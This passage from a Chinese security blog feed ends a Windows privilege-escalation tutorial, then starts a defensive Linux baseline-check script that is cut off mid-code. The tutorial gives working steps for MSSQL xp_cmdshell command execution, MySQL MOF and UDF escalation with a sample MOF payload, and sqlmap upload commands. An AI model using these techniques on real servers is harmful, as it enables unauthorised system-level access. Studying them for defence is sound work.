class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#先获取高权限的数据库用户(sysadmin）</span><br><span class="line">查找网站源码数据库链接文件（web.config &#x2F;conn.asp&#x2F;aspx config.asp &#x2F;aspx dbconfig.asp&#x2F;aspx)等文件，查找数据库链接信息，查找可进入数据库的用户名和密码</span><br><span class="line"></span><br><span class="line">理论上，什么用户启的数据库，xp_cmdshell就执行什么权限</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#爆破出用户名密码，或者收集到密码....等手段登入数据库，mssql可以外网登录</span><br><span class="line">select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)#查询是否为sysadmin用户，sysadmin执行命令继承了数据库的权限，前提在windows下，数据库(旧版本，新版本默认降权)默认没有被降权,默认就是system权限</span><br><span class="line">如果有注入的话，sqlmap --is-dba 也能判断</span><br><span class="line"></span><br><span class="line">#然后利用高权限用户执行反弹命令，脚本，木马什么的...</span><br><span class="line">默认cmd的组件禁用，必须安装cmd_shell组件</span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO </span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;, 1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &quot;whoami&quot; --</span><br></pre></td></tr></table></figure><p>MYSQL提权</p><p>MOF提权<br>简介：MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡，因为MOF文件每五秒就会执行，且是系统权限，所以如果我们有权限替换原有的mof文件，就能获得system权限<br>利用条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows&lt;&#x3D;2003（虽然很久远了，还是温习一下）</span><br><span class="line"></span><br><span class="line">mysql在c:windows&#x2F;system32&#x2F;mof目录有写权限</span><br><span class="line"></span><br><span class="line">已知数据库账号密码</span><br></pre></td></tr></table></figure><p>利用手法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#mysql语句将恶意mov文件替换nullevt.mof，需先上传</span><br><span class="line">select load_file(&quot;hacker.mof&quot;) into dumpfile &quot;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&quot;</span><br><span class="line"></span><br><span class="line">mof文件样本</span><br><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;命令\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>UDF提权<br>简介：UDF,user defined funcion,即用户自定义函数，用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll。<br>利用条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows2003、windowsXP、windows7</span><br><span class="line">拥有mysql的insert和delete权限</span><br></pre></td></tr></table></figure><p>漏洞利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#首先我们要判断mysql版本，根据不同的版本：</span><br><span class="line">mysql版本 &lt; 5.2 , UDF导出到系统目录c:&#x2F;windows&#x2F;system32&#x2F;</span><br><span class="line">mysql版本 &gt; 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\</span><br><span class="line">直接查询插件安装目录show variables like %plugin%</span><br><span class="line"></span><br><span class="line">#上传udf.dll 将udf.dll导出到插件目录，然后执行sql语句创建用户自定义函数,并利用他执行命令提权</span><br><span class="line">create function cmd_shell returns string soname &#39;udf.dll&#39;;#创建函数</span><br><span class="line">select cmd_shell(&#39;命令&#39;);#使用函数</span><br><span class="line">drop function cmd_shell; #删除函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#也可以自动化过程，使用sqlmap自动化上传插件</span><br><span class="line">python sqlmap.py -u &#39;xxxx&#39; --file-write&#x3D;&#x2F;lib_mysqludf_sys.so  --file-dest&#x3D;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;</span><br><span class="line">python sqlmap.py -u &#39;xxxx&#39; --sql-shell</span><br></pre></td></tr></table></figure><p>各种CVE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2016-6663和CVE-2016-6664,CVE-2016-6663,CVE-2016-6664,CVE-2016-6663,CVE-2016-6664</span><br></pre></td></tr></table></figure><h3 id="7-其他手法"><a href="#7-其他手法" class="headerlink" title="7.其他手法"></a>7.其他手法</h3><p>去寻找系统高权限运行的用户，服务，软件，程序，脚本，通过一定手法，比如cve，进程注入，dll劫持，实在不行社工</p><blockquote><p>扎实的基础+奇妙的思路+敏捷的手法=system权限</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>圣诞礼物之linux主机安全基线检查脚本</title>
      <link href="2020/12/25/%E5%9C%A3%E8%AF%9E%E7%A4%BC%E7%89%A9%E4%B9%8Blinux%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC/"/>
      <url>2020/12/25/%E5%9C%A3%E8%AF%9E%E7%A4%BC%E7%89%A9%E4%B9%8Blinux%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p><strong>脚本复制粘贴保存成.sh文件即可，报错的请apt，yum下载相应的工具嗷</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash </span></span><br><span class="line"></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># Linux主机安全基线检查</span></span><br><span class="line"><span class="comment"># Date:2020-12-23</span></span><br><span class="line"><span class="comment"># 使用前请给文件执行权限:chmod u+x check.sh</span></span><br><span class="line"><span class="comment"># 如提示找不到文件 在vi编辑模式下 set ff=uninx</span></span><br><span class="line"><span class="comment"># by Gamma安全实验室</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line">scanner_time=`date <span class="string">&#x27;+%Y-%m-%d_%H:%M:%S&#x27;</span>`</span><br><span class="line">mkdir Check_log</span><br><span class="line">scanner_log=<span class="string">&quot;./Check_log/checkResult_<span class="variable">$&#123;scanner_time&#125;</span>.log&quot;</span></span><br><span class="line">uptime=$(uptime | sed <span class="string">&#x27;s/.*up \([^,]*\), .*/\1/&#x27;</span>)</span><br><span class="line"><span class="comment">#调用函数库</span></span><br><span class="line">[ -f /etc/init.d/<span class="built_in">functions</span> ] &amp;&amp; <span class="built_in">source</span> /etc/init.d/<span class="built_in">functions</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment">#Require root to run this script.</span></span><br><span class="line">[ $(id -u) -gt 0 ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;请用root用户执行此脚本！&quot;</span> &amp;&amp; <span class="built_in">exit</span> 1</span><br><span class="line"><span class="comment">#报错日志记录</span></span><br><span class="line">[ -f <span class="variable">$&#123;scanner_log&#125;</span> ] || touch <span class="variable">$&#123;scanner_log&#125;</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getSystemStatus</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [ -e /etc/sysconfig/i18n ];<span class="keyword">then</span></span><br><span class="line">        default_LANG=<span class="string">&quot;<span class="subst">$(grep <span class="string">&quot;LANG=&quot;</span> /etc/sysconfig/i18n | grep -v <span class="string">&quot;^#&quot;</span> | awk -F &#x27;<span class="string">&quot;&#x27; &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;)&quot;</span></span></span></span><br><span class="line"><span class="string"><span class="subst">    else</span></span></span><br><span class="line"><span class="string"><span class="subst">        default_LANG=$LANG</span></span></span><br><span class="line"><span class="string"><span class="subst">    fi</span></span></span><br><span class="line"><span class="string"><span class="subst">    export LANG=<span class="string">&quot;en_US.UTF-8&quot;</span></span></span></span><br><span class="line"><span class="string"><span class="subst">    Release=$(cat /etc/redhat-release 2&gt;/dev/null)</span></span></span><br><span class="line"><span class="string">    Kernel=<span class="subst">$(uname -r)</span></span></span><br><span class="line"><span class="string">    OS=<span class="subst">$(uname -o)</span></span></span><br><span class="line"><span class="string">    Hostname=<span class="subst">$(uname -n)</span></span></span><br><span class="line"><span class="string">    SELinux=<span class="subst">$(/usr/sbin/sestatus | grep <span class="string">&quot;SELinux status: &quot;</span> | awk &#x27;&#123;print $3&#125;&#x27;)</span></span></span><br><span class="line"><span class="string">    LastReboot=<span class="subst">$(who -b | awk &#x27;&#123;print $3,$4&#125;&#x27;)</span></span></span><br><span class="line"><span class="string">    uptime=<span class="subst">$(uptime | sed &#x27;s/.*up \([^,]*\), .*/\1/&#x27;)</span></span></span><br><span class="line"><span class="string">    echo &quot;</span>     系统：<span class="variable">$OS</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span> 发行版本：<span class="variable">$Release</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span>     内核：<span class="variable">$Kernel</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span>   主机名：<span class="variable">$Hostname</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span>  SELinux：<span class="variable">$SELinux</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span>语言/编码：<span class="variable">$default_LANG</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span> 扫描时间：$(date +<span class="string">&#x27;%F %T&#x27;</span>)<span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span> 最后启动：<span class="variable">$LastReboot</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span> 运行时间：<span class="variable">$uptime</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    export LANG=&quot;</span><span class="variable">$default_LANG</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">bk_safe()&#123;</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">  echo -e &quot;</span>\033[33m********************************Linux主机安全基线检查***********************************\033[0m<span class="string">&quot;</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>***********************`hostname -s` 主机安全检查结果********************************<span class="string">&quot;  &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  getSystemStatus &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`账号策略检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[1] 账号策略检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  passmax=`cat /etc/login.defs | grep PASS_MAX_DAYS | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  passmin=`cat /etc/login.defs | grep PASS_MIN_DAYS | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  passlen=`cat /etc/login.defs | grep PASS_MIN_LEN | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  passage=`cat /etc/login.defs | grep PASS_WARN_AGE | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$passmax</span> -le 90 -a <span class="variable">$passmax</span> -gt 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 口令生存周期为<span class="variable">$&#123;passmax&#125;</span>天，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 口令生存周期为<span class="variable">$&#123;passmax&#125;</span>天，不符合要求,建议设置不大于90天<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$passmin</span> -ge 6 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 口令更改最小时间间隔为<span class="variable">$&#123;passmin&#125;</span>天，符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 口令更改最小时间间隔为<span class="variable">$&#123;passmin&#125;</span>天，不符合要求，建议设置大于等于6天<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$passlen</span> -ge 8 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 口令最小长度为<span class="variable">$&#123;passlen&#125;</span>,符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 口令最小长度为<span class="variable">$&#123;passlen&#125;</span>,不符合要求，建议设置最小长度大于等于8<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$passage</span> -ge 30 -a <span class="variable">$passage</span> -lt <span class="variable">$passmax</span> ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 口令过期警告时间天数为<span class="variable">$&#123;passage&#125;</span>,符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 口令过期警告时间天数为<span class="variable">$&#123;passage&#125;</span>,不符合要求，建议设置大于等于30并小于口令生存周期<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`登录超时检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[2] 登录超时检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  checkTimeout=<span class="subst">$(cat /etc/profile | grep TMOUT | awk -F[=] &#x27;&#123;print $2&#125;&#x27;)</span></span></span><br><span class="line"><span class="string">  if [ $? -eq 0 ];then</span></span><br><span class="line"><span class="string">    TMOUT=`cat /etc/profile | grep TMOUT | awk -F[=] &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">    if [ <span class="variable">$TMOUT</span> -le 600 -a <span class="variable">$TMOUT</span> -ge 10 ];then</span></span><br><span class="line"><span class="string">      echo &quot;</span>[Y] 账号超时的时间是<span class="variable">$&#123;TMOUT&#125;</span>秒,符合要求<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">      echo &quot;</span>[N] 账号超时的时间是<span class="variable">$&#123;TMOUT&#125;</span>秒,不符合要求，建议设置小于600秒<span class="string">&quot;&gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 账号超时不存在自动注销,不符合要求，建议设置小于600秒<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`特权用户检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[3] 特权用户检查中...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  UIDS=`awk -F[:] &#x27;NR!=1&#123;print <span class="variable">$3</span>&#125;&#x27; /etc/passwd`</span></span><br><span class="line"><span class="string">  flag=0</span></span><br><span class="line"><span class="string">  for i in <span class="variable">$UIDS</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">    if [ <span class="variable">$i</span> = 0 ];then</span></span><br><span class="line"><span class="string">       flag=1</span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  done</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$flag</span> != 1 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] 不存在root账号外的UID为0的异常用户<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] 存在非root但UID为0的异常用户，请立刻进行排查<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`空登录口令用户检查结果<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span 